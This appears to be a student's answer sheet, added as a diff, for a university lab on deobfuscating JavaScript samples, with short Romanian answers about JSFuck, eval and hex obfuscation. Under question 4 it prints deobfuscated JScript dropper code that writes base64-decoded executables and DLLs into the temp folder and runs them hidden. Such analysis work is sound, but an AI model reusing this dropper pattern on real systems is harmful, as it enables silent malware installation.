@@ -1,0 +1,116 @@
+https://lelinhtinh.github.io/de4js/
+
+
+1
+
+a
+Facultatea de Matematica si Informatica
+Universitatea din Bucuresti
+https://www.youtube.com/watch?v=HIcSWuKMwOw
+
+b
+am rulat codul
+
+
+c
+18367622009998665
+
+d
+un obsfucator jsfuck
+
+
+
+2
+
+a
+afiseaza niste mesaje, iar apoi incearca sa creeze un fisier txt si sa scrie ceva in el
+
+
+b
+nu neaparat, nu face nimic rau, dar e in scop demonstrativ
+
+c
+un obsfucator eval
+
+
+
+
+
+3
+
+
+a
+acelasi lucru
+
+b
+sunt niste valori scrise in hexazecimal, fiecare reprezinta cate o litera
+
+c
+fiind folosite aceste valori, codul este mai greu de analizat daca nu e rulat 
+
+
+
+
+
+4
+
+
+
+a
+
+var STRING_TEMP = "%temp%\\";
+
+function CreateObject(a){
+	return new ActiveXObject(a)
+}
+
+var SHELL = CreateObject("WScript.Shell"),
+STRING_TEMP = SHELL.ExpandEnvironmentStrings(STRING_TEMP);
+
+function FUNCTIE1(a,d){
+	var b = new CreateObject("ADODB.Stream"),
+	c = (new ActiveXObject("Msxml2.DOMDocument.6.0")).createElement("tmp");
+	c.dataType = "bin.base64";
+	c.text = a;
+	c = c.nodeTypedValue;
+	b.Type = 1;
+	b.Open();
+	b.Write(c);
+	b.SaveToFile(d,2);
+	b.Close()
+}
+
+function FUNCTIE2(a){
+	SHELL.Run(a,0,0);
+}
+
+
+try{
+
+	FUNCTIE1( TEXT , STRING_TEMP + "hello.exe");
+	FUNCTIE1( TEXT , STRING_TEMP + "libstdc++-6.dll");
+	FUNCTIE1( TEXT , STRING_TEMP + "libgcc_s_dw2-1.dll");
+	FUNCTIE1( TEXT , STRING_TEMP + "libmingwex-0.dll");
+	FUNCTIE2( STRING_TEMP + "hello.exe");
+}
+catch(error){
+	WScript.Echo("Hello!");
+}
+
+
+
+b
+prin decodificare comentariilor, simplificare codului cum am facut mai sus
+
+c
+discutabil
+
+d
+ss
+malware
+
+e.
+pare un fisier safe acum 
+
+
+
